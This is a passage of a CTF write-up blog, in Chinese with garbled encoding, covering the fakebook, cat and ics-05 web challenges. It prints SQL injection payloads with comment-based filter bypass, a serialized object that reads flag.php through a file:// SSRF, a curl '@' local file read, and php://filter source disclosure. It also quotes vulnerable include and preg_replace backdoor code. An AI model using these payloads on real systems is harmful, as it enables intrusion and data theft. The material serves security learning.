<p>ç»§ç»­å¾€ä¸‹ï¼Œåœ¨æ³¨å†Œç”¨æˆ·å’ŒæŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯å‚æ•°å¤„éƒ½å­˜åœ¨SQLæ—¶é—´ç›²æ³¨ï¼Œè€Œä¸”é¡µé¢æŠ¥é”™ä¹Ÿçˆ†å‡ºäº†ç½‘ç«™æ ¹ç›®å½•<code>/var/www/html/</code>ç›´æ¥SQLmapè·‘è¡¨</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604386702.png" alt="1604157974568.png"></p>
<p>è·‘fakebookåº“çš„å†…å®¹ï¼Œå‘ç°å­˜å‚¨çš„æ˜¯æ³¨å†Œç”¨æˆ·çš„ä¸ªäººä¿¡æ¯åºåˆ—åŒ–ç»“æœ</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604386709.png" alt="1604158158876.png"></p>
<p>å°è¯•åˆ©ç”¨SQLmapæ‰§è¡Œç³»ç»Ÿå‘½ä»¤å¤±è´¥äº†ï¼Œè¿™å°±æœ‰å¦å¤–ä¸€ä¸ªå¯èƒ½çš„åˆ©ç”¨æ–¹å¼äº†ï¼Œå·²çŸ¥ä¿¡æ¯å¦‚ä¸‹ï¼š</p>
<ul>
<li>å­˜åœ¨SSRFï¼Œå¯èƒ½ä»…åœ¨æ³¨å†Œæ—¶æ£€æŸ¥Blog URLçš„åˆæ³•æ€§</li>
<li>å­˜åœ¨SQLæ³¨å…¥</li>
<li>å·²çŸ¥ç½‘ç«™æ ¹ç›®å½•å’Œflag.phpä½ç½®</li>
<li>æ•°æ®åº“å­˜å‚¨çš„æ˜¯ä¸ªäººä¿¡æ¯çš„åºåˆ—åŒ–ç»“æœ</li>
</ul>
<p>åˆ©ç”¨è¿™äº›ï¼Œå¯ä»¥å°è¯•åœ¨æŸ¥è¯¢ç”¨æˆ·æ•°æ®ä¿¡æ¯æ—¶ï¼Œå°†ç”¨æˆ·çš„Blog URLæ”¹ä¸ºfileåè®®è¯»å–<strong>flag.php</strong>æ–‡ä»¶çš„SSRFåˆ©ç”¨ä»£ç ï¼Œæ„é€ åºåˆ—åŒ–ç»“æœå¹¶é€šè¿‡SQLæ³¨å…¥æ¥å®ŒæˆæŸ¥è¯¢ï¼Œå³å¯å¾—åˆ°Flagï¼ˆå½“ç„¶è¿™ä¹Ÿæ˜¯è¯»å¸ˆå‚…ä»¬æ–‡ç« å¾—åˆ°çš„å¯å‘~ï¼‰</p>
<p>é€šè¿‡å¯¹å‚æ•°nçš„SQLæ³¨å…¥æµ‹è¯•ï¼Œå¾—åˆ°æœ‰4ä¸ªå­—æ®µï¼Œç”¨æˆ·blogæ•°æ®åœ¨ç¬¬å››ä¸ªå­—æ®µï¼Œè€Œä¸”ç¨‹åºå¯¹<code>union select</code>æœ‰è¿‡æ»¤ï¼Œå¯ä»¥ä½¿ç”¨æ³¨é‡Š<code>/**/</code>æ›¿æ¢ç©ºæ ¼çš„æ–¹å¼ç»•è¿‡</p>
<p>payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no&#x3D;0&#x2F;**&#x2F;union&#x2F;**&#x2F;select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure>
<p>æˆåŠŸæ‰§è¡Œ</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604386731.png" alt="1604161297056.png"></p>
<p>æŸ¥çœ‹é¡µé¢æºç å·²ç»è¯»å‡ºflag.phpæ–‡ä»¶å†…å®¹ï¼Œåªä¸è¿‡åšäº†base64ç¼–ç åæ”¾åœ¨äº†iframeæ ‡ç­¾ä¸­</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604386745.png" alt="1604161517371.png"></p>
<p>å¯¹è¿™ä¸²base64è§£ç åŒæ ·æ˜¯å°±æ˜¯flag.phpæ–‡ä»¶çš„å†…å®¹</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604386755.png" alt="1604161465705.png"></p>
<p>çœ‹äº†å¸ˆå‚…ä»¬çš„wpï¼Œå¾—çŸ¥è¿˜æœ‰å¦ä¸€ç§æ›´ä¸ºç®€å•çš„ï¼Œä½†å…¶å®é“ç†æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯åˆ©ç”¨SQLæ³¨å…¥ï¼Œè¯»å–/var/www/html/flag.phpæ–‡ä»¶ï¼Œåªä¸è¿‡æ­¤æ–¹æ³•æ˜¯å°†æ•°æ®å›æ˜¾æ”¾åœ¨äº†å…¶ä»–å­—æ®µï¼Œæ¯”å¦‚å§“åè¥¿æ®µï¼Œå°±ä¸éœ€è¦åšåºåˆ—åŒ–äº†</p>
<p>payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x2F;**&#x2F;union&#x2F;**&#x2F;select 1,load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&#39;),3,4</span><br></pre></td></tr></table></figure>
<p>æ‰§è¡ŒåæŸ¥çœ‹æºç å³å¯å¾—åˆ°Flag</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604386764.png" alt="1604162503775.png"></p>
<h3 id="æ€»ç»“ä¸€ä¸‹"><a href="#æ€»ç»“ä¸€ä¸‹" class="headerlink" title="æ€»ç»“ä¸€ä¸‹"></a><strong>æ€»ç»“ä¸€ä¸‹</strong></h3><p>æ¼æ´ç‚¹ï¼šSSRFã€SQLæ³¨å…¥ã€æŠ¥é”™ä¿¡æ¯æ³„éœ²æ ¹ç›®å½•ï¼ŒWebæ‰«æå¾—åˆ°å…³é”®è·¯å¾„</p>
<h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a><strong>å‚è€ƒ</strong></h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42196196/article/details/81952174">https://blog.csdn.net/qq_42196196/article/details/81952174</a></p>
<p><a target="_blank" rel="noopener" href="http://www.mamicode.com/info-detail-2893815.html">http://www.mamicode.com/info-detail-2893815.html</a></p>
<h2 id="â­-catï¼ˆDjangoå®½å­—èŠ‚æŠ¥é”™-php-curl-è¯»å–æ–‡ä»¶ï¼‰"><a href="#â­-catï¼ˆDjangoå®½å­—èŠ‚æŠ¥é”™-php-curl-è¯»å–æ–‡ä»¶ï¼‰" class="headerlink" title="â­ catï¼ˆDjangoå®½å­—èŠ‚æŠ¥é”™+php curl @è¯»å–æ–‡ä»¶ï¼‰"></a>â­ catï¼ˆDjangoå®½å­—èŠ‚æŠ¥é”™+php curl @è¯»å–æ–‡ä»¶ï¼‰</h2><p>å¾ˆéš¾ï¼Œå‡ ä¹å®Œå…¨å‚è€ƒå¸ˆå‚…ä»¬çš„wpåšå®Œçš„ï¼Œå¤§ä½¬çš„æ€è·¯çœŸçš„é‡ï¼ğŸ˜…</p>
<p>ä¸€ä¸ªpingåŠŸèƒ½çš„ç³»ç»Ÿï¼Œå°è¯•ç®¡é“ç¬¦å‘½ä»¤æ‰§è¡Œå‘ç°è¢«è¿‡æ»¤ï¼ŒFUZZæµ‹è¯•ï¼Œå‘ç°urlè¿‡æ»¤å¤„çš„æ²¡æœ‰å¯¹ä»¥ä¸‹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè¿‡æ»¤ï¼š</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604387393.png" alt="1604207185171.png"></p>
<p>æµ‹è¯•å‘ç°åå°ä½¿ç”¨çš„æ˜¯GBKå®½å­—ç¬¦ç¼–ç ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹urlå‚æ•°å€¼ä¸ºå®½å­—ç¬¦**%df**åˆ¶é€ æŠ¥é”™ï¼Œå‘ç°åç«¯æ˜¯ç”¨Pythonçš„Djangoæ¡†æ¶å†™çš„</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604387401.png" alt="1604204281681 (1).png"></p>
<p>è€Œä¸”æ‰¾åˆ°äº†pingå‡½æ•°çš„å†…å®¹ï¼š</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604387409.png" alt="1604204491772 (1).png"></p>
<p>æŠŠä»£ç æ‹·åˆ°æœ¬åœ°ï¼Œæ•´ç†ä¸€ä¸‹ï¼Œå…¶å®ä¹Ÿå¾ˆç®€å•çš„é€»è¾‘ï¼Œç”šè‡³ä¸éœ€è¦æ‹·åˆ°æœ¬åœ°</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@process_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ping</span>(<span class="params">request</span>):</span></span><br><span class="line">	<span class="comment"># è½¬ä¹‰</span></span><br><span class="line">	data = request.POST.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">	data = escape(data)</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> re.match(<span class="string">&#x27;^[a-zA-Z0-9\-\./]+$&#x27;</span>, data):</span><br><span class="line">		<span class="keyword">return</span> HttpResponse(<span class="string">&quot;Invalid URL&quot;</span>)</span><br><span class="line">	<span class="keyword">return</span> HttpResponse(os.popen(<span class="string">&quot;ping -c 1 \&quot;%s\&quot;&quot;</span> % data).read())</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆ<code>escape()</code>å‡½æ•°å¯¹è¾“å…¥ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œç„¶åå°†è½¬ä¹‰ç»“æœæ”¾åœ¨<code>re.match()</code>ä¸­è¿›è¡ŒåŒ¹é…è¿‡æ»¤ï¼ŒåŒ¹é…ç½‘å€æˆ–ipçš„æ•°æ®æ ¼å¼ï¼Œæœ€åä½¿ç”¨<code>os.popen()</code>æ‰§è¡Œpingå‘½ä»¤ï¼Œå¾—åˆ°å¹¶è¿”å›ç»“æœã€‚</p>
<p>æ ¹æ®å¸ˆå‚…ä»¬çš„æ–‡ç« å¾—çŸ¥ï¼ŒåŸé¢˜ç›®åœ¨æ¯”èµ›ä¸­æ˜¯æœ‰æç¤ºçš„ï¼ˆ <code>RTFM of PHP CURL===&gt;&gt;read the fuck manul of PHP CURL???</code> ï¼‰ï¼Œæ‰€ä»¥æ­¤å¤„éœ€è¦åˆ©ç”¨PHP curlä¸­çš„@æ¥è¯»å–æ–‡ä»¶ï¼ŒæŸ¥æ‰¾PHPæ‰‹å†Œå¾—åˆ°äº†ä¸€äº›ä¿¡æ¯ï¼š<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.curlfile.php">https://www.php.net/manual/zh/class.curlfile.php</a></p>
<blockquote>
<p>There are â€œ@â€ issue on multipart POST requests.</p>
<p>Solution for PHP 5.5 or later:</p>
<ul>
<li>Enable CURLOPT_SAFE_UPLOAD.</li>
<li>Use CURLFile instead of â€œ@â€.</li>
</ul>
<p>Solution for PHP 5.4 or earlier:</p>
<ul>
<li>Build up multipart content body by youself.</li>
<li>Change â€œContent-Typeâ€ header by yourself.</li>
</ul>
</blockquote>
<p>æ‰‹å†Œæ€»çš„å¤§è‡´æ„æ€æ˜¯åœ¨php5.5ä¹‹åå°±åºŸå¼ƒäº†POSTè¯·æ±‚ä¸­<code>@+æ–‡ä»¶è·¯å¾„</code>çš„ä¸Šä¼ æ–‡ä»¶æ–¹æ³•ã€‚åœ¨å¤–ç½‘æ‰¾åˆ°äº†ä¸€ä¸ªç›¸å…³ä½¿ç”¨ç¤ºä¾‹ï¼š</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604387427.png" alt="1604209282439(1).png"></p>
<p>åˆ©ç”¨æ­¤å‰çš„é¡µé¢æŠ¥é”™å¾—åˆ°çš„Djangoé¡¹ç›®è·¯å¾„ï¼Œä»¥åŠåœ¨æŠ¥é”™é¡µé¢æœç´¢å¾—åˆ°çš„database.sqlite3æ•°æ®åº“æ–‡ä»¶ï¼Œå°è¯•è¯»å–è¯¥æ•°æ®åº“æ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@&#x2F;opt&#x2F;api&#x2F;database.sqlite3</span><br></pre></td></tr></table></figure>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604387435.png" alt="1604214520408 (1).png"></p>
<p>é¡µé¢æœç´¢CTFï¼Œå¾—åˆ°Flagï¼š<code>AWHCTF&#123;yoooo_Such_A_G00D_@&#125;</code></p>
<h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>è§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆæ­¤å¤„èƒ½å¤Ÿè¯»å–åˆ°æ–‡ä»¶ï¼Œæ­£å¸¸ç¨‹åºPOSTè¯·æ±‚å’ŒFILEè¯·æ±‚æ˜¯åˆ†å¼€çš„ï¼Œä½†æ˜¯é¢˜ç›®ä¸­å°†FILEè¯·æ±‚å’ŒPOSTè¯·æ±‚åˆå¹¶åˆ°äº†ä¸€å—ï¼š</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604387447.png" alt="1604216002158.png"></p>
<p>åŒæ—¶åˆå°†<strong>CONTENT_TYPE</strong>è®¾å®šä¸ºå¥‡æ€ªçš„<code>multipart/form-data</code></p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604387456.png" alt="1604216203986.png"></p>
<p>è€ŒPHPçš„curlä¸­@ä¸Šä¼ æ–‡ä»¶æ­£å¥½æ˜¯åœ¨éœ€è¦ <code>multipart/form-data</code> æ‰€ä»¥çŒœæµ‹åå°çš„<strong>ç¨‹åºé€»è¾‘</strong>æ˜¯ï¼š</p>
<ul>
<li>PHPæ¥æ”¶GETå‚æ•°ï¼Œä½¿ç”¨POSTæ–¹å¼ä¼ é€’ç»™åå°Djangoæ­å»ºçš„api</li>
<li>Djangoå¯¹PHPä¼ è¿›æ¥çš„POSTæ•°æ®åšGBKç¼–ç </li>
<li>GBKç¼–ç åå†æ‰§è¡ŒDjangoä¸­çš„pingæ“ä½œ</li>
</ul>
<p>æ‰€ä»¥èƒ½å¤Ÿåˆ©ç”¨å¹¶<strong>è¯»å–æ–‡ä»¶çš„åŸç†</strong>æ˜¯ï¼š</p>
<ul>
<li>åˆ©ç”¨PHPçš„curl @è¯»å–æ–‡ä»¶åï¼ŒPOSTä¼ é€’ç»™Djangoåšç¼–ç å¤„ç†</li>
<li>Djangoä¸­GBKç¼–ç æ— æ³•å¯¹POSTä¼ é€’çš„æ–‡ä»¶å†…å®¹ä¸­è¶…è¿‡%7Fçš„å­—ç¬¦åšç¼–è§£ç å¤„ç†å°±ä¼šæŠ¥é”™ï¼Œæ¯”å¦‚<code>\xe6</code></li>
<li>Djangoå¼€å¯äº†debugï¼Œæ‰€ä»¥ä¼šå°†POSTæ•°æ®ä½œä¸ºæŠ¥é”™è¾“å‡ºåˆ°é¡µé¢</li>
</ul>
<p>ä¹Ÿæ˜¯å‚è€ƒå¸ˆå‚…ä»¬å­¦ä¹ çš„ï¼Œè·¯å­å¤ªé‡äº†~</p>
<h3 id="å‚è€ƒ-1"><a href="#å‚è€ƒ-1" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a target="_blank" rel="noopener" href="http://www.wupco.cn/?p=4195">http://www.wupco.cn/?p=4195</a></p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.curl-setopt.php">https://www.php.net/manual/zh/function.curl-setopt.php</a></p>
<p><a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/2019/12/30/5e0957fc025dc/">https://www.dazhuanlan.com/2019/12/30/5e0957fc025dc/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.curlfile.php">https://www.php.net/manual/zh/class.curlfile.php</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Jleixin/p/13024972.html">https://www.cnblogs.com/Jleixin/p/13024972.html</a></p>
<p><a target="_blank" rel="noopener" href="http://code.iamkate.com/php/sending-files-using-curl/">http://code.iamkate.com/php/sending-files-using-curl/</a></p>
<h2 id="â­-ics-05ï¼ˆæ–‡ä»¶åŒ…å«-php-filteræœ¬åœ°è¯»å–-preg-replace-å‘½ä»¤æ‰§è¡Œï¼‰"><a href="#â­-ics-05ï¼ˆæ–‡ä»¶åŒ…å«-php-filteræœ¬åœ°è¯»å–-preg-replace-å‘½ä»¤æ‰§è¡Œï¼‰" class="headerlink" title="â­ ics-05ï¼ˆæ–‡ä»¶åŒ…å«+php://filteræœ¬åœ°è¯»å–+preg_replace()å‘½ä»¤æ‰§è¡Œï¼‰"></a>â­ ics-05ï¼ˆæ–‡ä»¶åŒ…å«+php://filteræœ¬åœ°è¯»å–+preg_replace()å‘½ä»¤æ‰§è¡Œï¼‰</h2><p>é¢˜ç›®æè¿°ï¼š å…¶ä»–ç ´åè€…ä¼šåˆ©ç”¨å·¥æ§äº‘ç®¡ç†ç³»ç»Ÿè®¾å¤‡ç»´æŠ¤ä¸­å¿ƒçš„åé—¨å…¥ä¾µç³»ç»Ÿï¼Œæ‰€ä»¥ç›´æ¥è¿›ä¹ é€šçš„ç»´æŠ¤ä¸­å¿ƒæ¿å—ï¼Œä½†æ˜¯å‘ç°é¡µé¢æ˜¯æ¥å£è¯·æ±‚å¼‚å¸¸</p>
<p>ç‚¹å‡»åšä¸Šè¾¹çš„æ ‡é¢˜ï¼Œå‘ç°urlä¸­pageå‚æ•°åŒ…å«äº†indexé¡µé¢ï¼Œè€ƒè™‘æ˜¯å¦å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604393476.png" alt="1604245119902 (1).png"></p>
<p>å°†pageå‚æ•°æ”¹ä¸º<code>/etc/passwd</code>æˆåŠŸåŒ…å«ï¼Œçš„ç¡®å­˜åœ¨ï¼Œä½†æ˜¯å°è¯•å…¶ä»–æ–‡ä»¶åˆæ²¡æœ‰ååº”ï¼Œè€Œä¸”å½“è¾“å…¥çš„æ˜¯å­—ç¬¦ä¸²æ—¶ï¼Œä¼šç›´æ¥è¾“å‡ºè¯¥å­—ç¬¦ä¸²ï¼Œä¸å¤ªç†è§£â€¦â€¦</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604393505.png" alt="1604245312186 (1).png"></p>
<p>FUZZè·‘ä¸€ä¸‹ç‰¹æ®Šå­—ç¬¦ï¼Œå‘ç°æ‰€æœ‰å­—ç¬¦éƒ½ä¼šè¢«è¿‡æ»¤ï¼Œå”¯ç‹¬<code>#</code>ä¸ä¼šè¿‡æ»¤ï¼Œä¸”ä¼šä½œä¸ºæˆªæ–­ç¬¦å·</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604393520.png" alt="1604245457548(1).png"></p>
<p>æ‰€ä»¥è€ƒè™‘èƒ½ä¸èƒ½SQLæ³¨å…¥ï¼Œä½†æ˜¯å°è¯•äº†å¾ˆä¹…éƒ½æ²¡æœ‰ç»“æœï¼Œå®åœ¨æ²¡åŠæ³•ï¼Œçœ‹äº†å¸ˆå‚…ä»¬çš„wpå¾—çŸ¥ï¼Œæ­¤å¤„éœ€è¦<strong>åˆ©ç”¨æ–‡ä»¶åŒ…å«ï¼Œé€šè¿‡phpä¼ªåè®®<code>php://filter</code>æ¥è¯»å–æ–‡ä»¶</strong>ã€‚</p>
<p>OKï¼Œæ—¢ç„¶çŸ¥é“äº†åˆ©ç”¨æ‰‹æ®µï¼Œå¼€å§‹å­¦ä¹ å‘—ã€‚</p>
<p>å®˜æ–¹è§£é‡Š<code>php://filter</code>æ˜¯ ä¸€ç§åŸå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚ï¼Œå…¶å®å°±æ˜¯å¯¹æ•°æ®æµè¿›è¡Œè¿‡æ»¤ï¼Œä»¥å½“å‰é¢˜ç›®çš„payloadæ¥å®ä¾‹åˆ†æï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œè¾¹ï¼š</p>
<ul>
<li><strong>php:</strong> ä»£è¡¨ä¸€ç§phpåè®®ï¼›</li>
<li>**php://filter/ **è¡¨ç¤ºç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ï¼›</li>
<li><strong>read=convert.base64-encode</strong> ä»£è¡¨è¯»å–çš„æ˜¯base64ç¼–ç åçš„ç»“æœï¼›</li>
<li>**/resource=index.php **è¡¨ç¤ºè¦è¯»å–çš„ç›®æ ‡æ–‡ä»¶æ˜¯index.phpã€‚</li>
</ul>
<p>å½“ç„¶è¿˜å¯ä»¥å†™æ–‡ä»¶ï¼Œå…·ä½“è§ä»¥ä¸‹é“¾æ¥åŠå®˜æ–¹æ‰‹å†Œï¼š</p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php.php"><strong>https://www.php.net/manual/zh/wrappers.php.php</strong></a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linuxsec/articles/12684259.html"><strong>https://www.cnblogs.com/linuxsec/articles/12684259.html</strong></a></p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604393571.png" alt="1604246054845 (1).png"></p>
<p>æ‰€ä»¥payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure>
<p>è¯»å–index.phpçš„base64ç¼–ç åçš„å†…å®¹ï¼Œå¹¶è¾“å‡ºåœ¨é¡µé¢</p>
<p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604393584.png" alt="1604246697723 (1).png"></p>
<p>base64è§£ç åï¼Œå¾—åˆ°index.phpçš„æºç ï¼Œä¸»è¦çš„éƒ¨åˆ†æœ‰ä»¥ä¸‹3ä¸ªç‰‡æ®µ</p>
<p><strong>1</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$page</span> = <span class="variable">$_GET</span>[page];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (ctype_alnum(<span class="variable">$page</span>)) &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">    &lt;div style=<span class="string">&quot;text-align:center&quot;</span>&gt;</span><br><span class="line">        &lt;p class=&quot;lead&quot;&gt;&lt;?php echo $page; die();?&gt;&lt;/p&gt;</span><br><span class="line">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¿™æ®µä¸»è¦åœ¨ç¬¬9è¡Œï¼Œè§£é‡Šäº†ä¸ºä»€ä¹ˆä¼šè¿”å›å­—ç¬¦ä¸²</p>
<p><strong>2</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (strpos(<span class="variable">$page</span>, <span class="string">&#x27;input&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">if</span> (strpos(<span class="variable">$page</span>, <span class="string">&#x27;ta:text&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strpos(<span class="variable">$page</span>, <span class="string">&#x27;text&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$page</span> === <span class="string">&#x27;index.php&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Ok&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¿™æ®µå¯¹åŒ…å«çš„æ–‡ä»¶ååšäº†è¿‡æ»¤ï¼Œå¹¶å¯¹åŒ…å«index.phpçš„è¿”å›å€¼åšäº†é‡å†™ï¼Œæ‰€ä»¥æ— æ³•åŒ…å«ç›´æ¥å¾—åˆ°index.phpæºç ï¼Œç„¶åå¦‚æœæ²¡æœ‰è¢«ç”„åˆ«åˆ°çš„è¯ï¼Œæœºä¼šæ‰§è¡Œ14è¡Œçš„åŒ…å«æ–‡ä»¶æ“ä½œï¼Œæ²¡æœ‰å…¶ä»–çš„å®‰å…¨æ ¡éªŒäº†</p>
<p><strong>3</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ–¹ä¾¿çš„å®ç°è¾“å…¥è¾“å‡ºçš„åŠŸèƒ½,æ­£åœ¨å¼€å‘ä¸­çš„åŠŸèƒ½ï¼Œåªèƒ½å†…éƒ¨äººå‘˜æµ‹è¯•</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] === <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pattern</span> = <span class="variable">$_GET</span>[pat];</span><br><span class="line">    <span class="variable">$replacement</span> = <span class="variable">$_GET</span>[rep];</span><br><span class="line">    <span class="variable">$subject</span> = <span class="variable">$_GET</span>[sub];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$pattern</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$replacement</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$subject</span>)) &#123;</span><br><span class="line">        preg_replace(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
